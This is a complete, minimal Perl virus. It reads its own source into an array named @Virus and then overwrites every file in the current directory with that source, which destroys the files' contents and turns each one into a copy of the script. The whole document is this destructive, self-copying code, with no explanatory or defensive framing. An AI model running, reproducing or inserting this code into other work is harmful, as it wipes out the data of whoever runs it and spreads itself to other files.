 #!/usr/bin/perl

 open(File,$0);
 @Virus=<File>;
 close(File);

 foreach $FileName (<*>)
 {
  open(File, ">$FileName");
  print File @Virus;
  close (File);
 }


